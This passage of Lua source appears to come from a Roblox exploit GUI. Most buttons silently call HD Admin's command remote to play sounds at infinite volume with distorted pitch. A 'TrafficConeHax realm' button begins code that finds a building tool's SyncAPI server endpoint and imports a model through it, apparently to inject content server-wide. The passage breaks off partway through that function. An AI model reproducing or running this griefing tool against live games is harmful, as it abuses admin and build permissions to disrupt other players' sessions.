local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 137235825465862 ;volume inf ;pitch 0.1")
end)
end

local TextButton18 = Instance.new("TextButton")
TextButton18.Name = "TextButton"
TextButton18.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton18.Text = "MLG sandstorm remix"
TextButton18.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton18.TextSize = 17
TextButton18.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton18.TextWrapped = true
TextButton18.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton18.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton18.BorderSizePixel = 2
TextButton18.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton18.Size = UDim2.new(0, 113, 0, 53)
TextButton18.ZIndex = 2
TextButton18.Parent = R[379]

local LocalScript19 = Instance.new("Folder")
LocalScript19.Name = "LocalScript"
LocalScript19.Parent = TextButton18
__S[#__S + 1] = function(...)
local script = LocalScript19
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 78037745124851 ;volume inf ;pitch 0.095")
end)
end

local TextButton19 = Instance.new("TextButton")
TextButton19.Name = "TextButton"
TextButton19.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton19.Text = "damn son remix"
TextButton19.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton19.TextSize = 17
TextButton19.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton19.TextWrapped = true
TextButton19.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton19.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton19.BorderSizePixel = 2
TextButton19.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton19.Size = UDim2.new(0, 113, 0, 53)
TextButton19.ZIndex = 2
TextButton19.Parent = R[379]

local LocalScript20 = Instance.new("Folder")
LocalScript20.Name = "LocalScript"
LocalScript20.Parent = TextButton19
__S[#__S + 1] = function(...)
local script = LocalScript20
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 106463937415054 ;volume inf ;pitch 0.085")
end)
end

local TextButton20 = Instance.new("TextButton")
TextButton20.Name = "TextButton"
TextButton20.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton20.Text = "oh yeah mr krabs"
TextButton20.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton20.TextSize = 17
TextButton20.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton20.TextWrapped = true
TextButton20.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton20.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton20.BorderSizePixel = 2
TextButton20.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton20.Size = UDim2.new(0, 113, 0, 53)
TextButton20.ZIndex = 2
TextButton20.Parent = R[379]

local LocalScript21 = Instance.new("Folder")
LocalScript21.Name = "LocalScript"
LocalScript21.Parent = TextButton20
__S[#__S + 1] = function(...)
local script = LocalScript21
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 135981839980529 ;volume inf ;pitch 0.07")
end)
end

local TextButton21 = Instance.new("TextButton")
TextButton21.Name = "TextButton"
TextButton21.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton21.Text = "mario.exe unpitched"
TextButton21.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton21.TextSize = 17
TextButton21.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton21.TextWrapped = true
TextButton21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton21.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton21.BorderSizePixel = 2
TextButton21.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton21.Size = UDim2.new(0, 113, 0, 53)
TextButton21.ZIndex = 2
TextButton21.Parent = R[379]

local LocalScript22 = Instance.new("Folder")
LocalScript22.Name = "LocalScript"
LocalScript22.Parent = TextButton21
__S[#__S + 1] = function(...)
local script = LocalScript22
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 118602885567179 ;volume inf")
end)
end

local TextButton22 = Instance.new("TextButton")
TextButton22.Name = "TextButton"
TextButton22.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton22.Text = "YRI"
TextButton22.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton22.TextSize = 17
TextButton22.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton22.TextWrapped = true
TextButton22.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton22.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton22.BorderSizePixel = 2
TextButton22.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton22.Size = UDim2.new(0, 113, 0, 53)
TextButton22.ZIndex = 2
TextButton22.Parent = R[379]

local LocalScript23 = Instance.new("Folder")
LocalScript23.Name = "LocalScript"
LocalScript23.Parent = TextButton22
__S[#__S + 1] = function(...)
local script = LocalScript23
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 100861004769608 ;volume inf ;pitch 0.083")
end)
end

local TextButton23 = Instance.new("TextButton")
TextButton23.Name = "TextButton"
TextButton23.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton23.Text = "idk name"
TextButton23.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton23.TextSize = 17
TextButton23.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton23.TextWrapped = true
TextButton23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton23.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton23.BorderSizePixel = 2
TextButton23.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton23.Size = UDim2.new(0, 113, 0, 53)
TextButton23.ZIndex = 2
TextButton23.Parent = R[379]

local LocalScript24 = Instance.new("Folder")
LocalScript24.Name = "LocalScript"
LocalScript24.Parent = TextButton23
__S[#__S + 1] = function(...)
local script = LocalScript24
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 123216747962868 ;volume inf ;pitch 0.085")
end)
end

local TextButton24 = Instance.new("TextButton")
TextButton24.Name = "TextButton"
TextButton24.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton24.Text = "ncs music"
TextButton24.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton24.TextSize = 17
TextButton24.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton24.TextWrapped = true
TextButton24.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton24.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton24.BorderSizePixel = 2
TextButton24.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton24.Size = UDim2.new(0, 113, 0, 53)
TextButton24.ZIndex = 2
TextButton24.Parent = R[379]

local LocalScript25 = Instance.new("Folder")
LocalScript25.Name = "LocalScript"
LocalScript25.Parent = TextButton24
__S[#__S + 1] = function(...)
local script = LocalScript25
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 88097223667142 ;volume inf ;pitch 0.07")
end)
end

local TextButton25 = Instance.new("TextButton")
TextButton25.Name = "TextButton"
TextButton25.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton25.Text = "idk wtf ts is"
TextButton25.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton25.TextSize = 17
TextButton25.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton25.TextWrapped = true
TextButton25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton25.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton25.BorderSizePixel = 2
TextButton25.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton25.Size = UDim2.new(0, 113, 0, 53)
TextButton25.ZIndex = 2
TextButton25.Parent = R[379]

local LocalScript26 = Instance.new("Folder")
LocalScript26.Name = "LocalScript"
LocalScript26.Parent = TextButton25
__S[#__S + 1] = function(...)
local script = LocalScript26
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 104163618091537 ;volume inf ;pitch 0.11")
end)
end

local TextButton26 = Instance.new("TextButton")
TextButton26.Name = "TextButton"
TextButton26.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton26.Text = "omfg - i love you"
TextButton26.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton26.TextSize = 17
TextButton26.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton26.TextWrapped = true
TextButton26.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton26.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton26.BorderSizePixel = 2
TextButton26.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton26.Size = UDim2.new(0, 113, 0, 53)
TextButton26.ZIndex = 2
TextButton26.Parent = R[379]

local LocalScript27 = Instance.new("Folder")
LocalScript27.Name = "LocalScript"
LocalScript27.Parent = TextButton26
__S[#__S + 1] = function(...)
local script = LocalScript27
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 90054735589094 ;volume inf")
end)
end

local TextButton27 = Instance.new("TextButton")
TextButton27.Name = "TextButton"
TextButton27.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton27.Text = "idk name but its good"
TextButton27.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton27.TextSize = 17
TextButton27.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton27.TextWrapped = true
TextButton27.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton27.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton27.BorderSizePixel = 2
TextButton27.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton27.Size = UDim2.new(0, 113, 0, 53)
TextButton27.ZIndex = 2
TextButton27.Parent = R[379]

local LocalScript28 = Instance.new("Folder")
LocalScript28.Name = "LocalScript"
LocalScript28.Parent = TextButton27
__S[#__S + 1] = function(...)
local script = LocalScript28
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 97533689100624 ;volume inf")
end)
end

local TextButton28 = Instance.new("TextButton")
TextButton28.Name = "TextButton"
TextButton28.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton28.Text = "hellcat"
TextButton28.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton28.TextSize = 17
TextButton28.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton28.TextWrapped = true
TextButton28.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton28.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton28.BorderSizePixel = 2
TextButton28.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton28.Size = UDim2.new(0, 113, 0, 53)
TextButton28.ZIndex = 2
TextButton28.Parent = R[379]

local LocalScript29 = Instance.new("Folder")
LocalScript29.Name = "LocalScript"
LocalScript29.Parent = TextButton28
__S[#__S + 1] = function(...)
local script = LocalScript29
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 123846596033487 ;volume inf ;pitch 0.055")
end)
end

local TextButton29 = Instance.new("TextButton")
TextButton29.Name = "TextButton"
TextButton29.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton29.Text = "wii music"
TextButton29.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton29.TextSize = 17
TextButton29.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton29.TextWrapped = true
TextButton29.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton29.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton29.BorderSizePixel = 2
TextButton29.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton29.Size = UDim2.new(0, 113, 0, 53)
TextButton29.ZIndex = 2
TextButton29.Parent = R[379]

local LocalScript30 = Instance.new("Folder")
LocalScript30.Name = "LocalScript"
LocalScript30.Parent = TextButton29
__S[#__S + 1] = function(...)
local script = LocalScript30
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 104655883531400 ;volume inf")
end)
end

local TextButton30 = Instance.new("TextButton")
TextButton30.Name = "TextButton"
TextButton30.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton30.Text = "again idk name but idk bro"
TextButton30.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton30.TextSize = 17
TextButton30.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton30.TextWrapped = true
TextButton30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton30.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton30.BorderSizePixel = 2
TextButton30.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton30.Size = UDim2.new(0, 113, 0, 53)
TextButton30.ZIndex = 2
TextButton30.Parent = R[379]

local LocalScript31 = Instance.new("Folder")
LocalScript31.Name = "LocalScript"
LocalScript31.Parent = TextButton30
__S[#__S + 1] = function(...)
local script = LocalScript31
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 70458162998642 ;volume inf")
end)
end

local TextButton31 = Instance.new("TextButton")
TextButton31.Name = "TextButton"
TextButton31.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton31.Text = "lose yourself"
TextButton31.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton31.TextSize = 17
TextButton31.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton31.TextWrapped = true
TextButton31.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton31.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton31.BorderSizePixel = 2
TextButton31.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton31.Size = UDim2.new(0, 113, 0, 53)
TextButton31.ZIndex = 2
TextButton31.Parent = R[379]

local LocalScript32 = Instance.new("Folder")
LocalScript32.Name = "LocalScript"
LocalScript32.Parent = TextButton31
__S[#__S + 1] = function(...)
local script = LocalScript32
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 89600977926965 ;volume inf ;pitch 0.046")
end)
end

local TextButton32 = Instance.new("TextButton")
TextButton32.Name = "TextButton"
TextButton32.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton32.Text = "funky town"
TextButton32.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton32.TextSize = 17
TextButton32.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton32.TextWrapped = true
TextButton32.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton32.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton32.BorderSizePixel = 2
TextButton32.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton32.Size = UDim2.new(0, 113, 0, 53)
TextButton32.ZIndex = 2
TextButton32.Parent = R[379]

local LocalScript33 = Instance.new("Folder")
LocalScript33.Name = "LocalScript"
LocalScript33.Parent = TextButton32
__S[#__S + 1] = function(...)
local script = LocalScript33
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 132666941857677 ;volume inf ;pitch 0.05")
end)
end

local TextButton33 = Instance.new("TextButton")
TextButton33.Name = "TextButton"
TextButton33.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton33.Text = "kiss me again original"
TextButton33.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton33.TextSize = 17
TextButton33.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton33.TextWrapped = true
TextButton33.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton33.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton33.BorderSizePixel = 2
TextButton33.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton33.Size = UDim2.new(0, 113, 0, 53)
TextButton33.ZIndex = 2
TextButton33.Parent = R[379]

local LocalScript34 = Instance.new("Folder")
LocalScript34.Name = "LocalScript"
LocalScript34.Parent = TextButton33
__S[#__S + 1] = function(...)
local script = LocalScript34
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 100592486845638 ;volume inf ;pitch 0.053")
end)
end

local TextButton34 = Instance.new("TextButton")
TextButton34.Name = "TextButton"
TextButton34.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton34.Text = "big d randy"
TextButton34.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton34.TextSize = 17
TextButton34.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton34.TextWrapped = true
TextButton34.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton34.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton34.BorderSizePixel = 2
TextButton34.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton34.Size = UDim2.new(0, 113, 0, 53)
TextButton34.ZIndex = 2
TextButton34.Parent = R[379]

local LocalScript35 = Instance.new("Folder")
LocalScript35.Name = "LocalScript"
LocalScript35.Parent = TextButton34
__S[#__S + 1] = function(...)
local script = LocalScript35
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 98421169251993 ;volume inf ;pitch 0.085")
end)
end

local TextButton35 = Instance.new("TextButton")
TextButton35.Name = "TextButton"
TextButton35.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton35.Text = "subway sexists V2"
TextButton35.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton35.TextSize = 17
TextButton35.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton35.TextWrapped = true
TextButton35.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton35.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton35.BorderSizePixel = 2
TextButton35.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton35.Size = UDim2.new(0, 113, 0, 53)
TextButton35.ZIndex = 2
TextButton35.Parent = R[379]

local LocalScript36 = Instance.new("Folder")
LocalScript36.Name = "LocalScript"
LocalScript36.Parent = TextButton35
__S[#__S + 1] = function(...)
local script = LocalScript36
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 122754832976166 ;volume inf ;pitch 0.055")
end)
end

local TextButton36 = Instance.new("TextButton")
TextButton36.Name = "TextButton"
TextButton36.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton36.Text = "it was a good day"
TextButton36.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton36.TextSize = 17
TextButton36.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton36.TextWrapped = true
TextButton36.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton36.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton36.BorderSizePixel = 2
TextButton36.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton36.Size = UDim2.new(0, 113, 0, 53)
TextButton36.ZIndex = 2
TextButton36.Parent = R[379]

local LocalScript37 = Instance.new("Folder")
LocalScript37.Name = "LocalScript"
LocalScript37.Parent = TextButton36
__S[#__S + 1] = function(...)
local script = LocalScript37
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 126080800396054 ;volume inf ;pitch 0.046")
end)
end

local TextButton37 = Instance.new("TextButton")
TextButton37.Name = "TextButton"
TextButton37.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton37.Text = "better off alone"
TextButton37.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton37.TextSize = 17
TextButton37.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton37.TextWrapped = true
TextButton37.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton37.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton37.BorderSizePixel = 2
TextButton37.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton37.Size = UDim2.new(0, 113, 0, 53)
TextButton37.ZIndex = 2
TextButton37.Parent = R[379]

local LocalScript38 = Instance.new("Folder")
LocalScript38.Name = "LocalScript"
LocalScript38.Parent = TextButton37
__S[#__S + 1] = function(...)
local script = LocalScript38
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 108519040671783 ;volume inf ;pitch 0.041")
end)
end

local Page4 = Instance.new("Frame")
Page4.Name = "Page4"
Page4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Page4.BackgroundTransparency = 1
Page4.BorderColor3 = Color3.fromRGB(0, 0, 0)
Page4.BorderSizePixel = 0
Page4.Position = UDim2.new(-0.00184162066, 0, 0.0350877196, 0)
Page4.Size = UDim2.new(0, 543, 0, 530)
Page4.Visible = false
Page4.Parent = R[2]

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Name = "ScrollingFrame"
ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BackgroundTransparency = 0.5
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Size = UDim2.new(0, 543, 0, 385)
ScrollingFrame.Parent = Page4

local UIGridLayout = Instance.new("UIGridLayout")
UIGridLayout.Name = "UIGridLayout"
UIGridLayout.CellSize = UDim2.new(0, 100, 0, 55)
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.Parent = ScrollingFrame

local mc = Instance.new("TextButton")
mc.Name = "mc"
mc.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
mc.Text = "giant mcdonalds"
mc.TextColor3 = Color3.fromRGB(255, 255, 255)
mc.TextSize = 16
mc.TextWrapped = true
mc.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mc.BorderColor3 = Color3.fromRGB(0, 242, 255)
mc.Position = UDim2.new(-0.00116050732, 0, 0.352456152, 0)
mc.Size = UDim2.new(0, 87, 0, 35)
mc.Parent = ScrollingFrame

local scp087 = Instance.new("TextButton")
scp087.Name = "scp087"
scp087.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
scp087.Text = "scp 078"
scp087.TextColor3 = Color3.fromRGB(255, 255, 255)
scp087.TextSize = 16
scp087.TextWrapped = true
scp087.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
scp087.BorderColor3 = Color3.fromRGB(0, 242, 255)
scp087.Position = UDim2.new(0.169762865, 0, 0.352368355, 0)
scp087.Size = UDim2.new(0, 87, 0, 35)
scp087.Parent = ScrollingFrame

local mw2rust = Instance.new("TextButton")
mw2rust.Name = "mw2rust"
mw2rust.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
mw2rust.Text = "rust from mw2"
mw2rust.TextColor3 = Color3.fromRGB(255, 255, 255)
mw2rust.TextSize = 16
mw2rust.TextWrapped = true
mw2rust.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mw2rust.BorderColor3 = Color3.fromRGB(0, 242, 255)
mw2rust.Position = UDim2.new(0, 0, 0.235789493, 0)
mw2rust.Size = UDim2.new(0, 87, 0, 35)
mw2rust.Parent = ScrollingFrame

local TrafficConeHaxRealm = Instance.new("TextButton")
TrafficConeHaxRealm.Name = "TrafficConeHaxRealm"
TrafficConeHaxRealm.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TrafficConeHaxRealm.Text = "TrafficConeHax realm"
TrafficConeHaxRealm.TextColor3 = Color3.fromRGB(255, 255, 255)
TrafficConeHaxRealm.TextSize = 14
TrafficConeHaxRealm.TextWrapped = true
TrafficConeHaxRealm.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TrafficConeHaxRealm.BorderColor3 = Color3.fromRGB(0, 242, 255)
TrafficConeHaxRealm.Position = UDim2.new(0.169905454, 0, 0.235789493, 0)
TrafficConeHaxRealm.Size = UDim2.new(0, 87, 0, 35)
TrafficConeHaxRealm.Parent = ScrollingFrame

local LocalScript39 = Instance.new("Folder")
LocalScript39.Name = "LocalScript"
LocalScript39.Parent = TrafficConeHaxRealm
__S[#__S + 1] = function(...)
local script = LocalScript39
local button = script.Parent

button.MouseButton1Click:Connect(function()
	local function poopnoremove(id)
		-- fixed by 1sw0rd1
		-- edit by trafficconehax

		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
				tool = v.Parent
			end
		end
		if tool == nil then
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
		end
		remote = tool.SyncAPI.ServerEndpoint

		local model_id = id
		local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
		imported_model.Parent = game.Lighting

		local destination = workspace:FindFirstChildOfClass("Terrain")

		if tool ~= nil and tool:FindFirstChild("Tools") and tool:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
			destination = workspace
		end

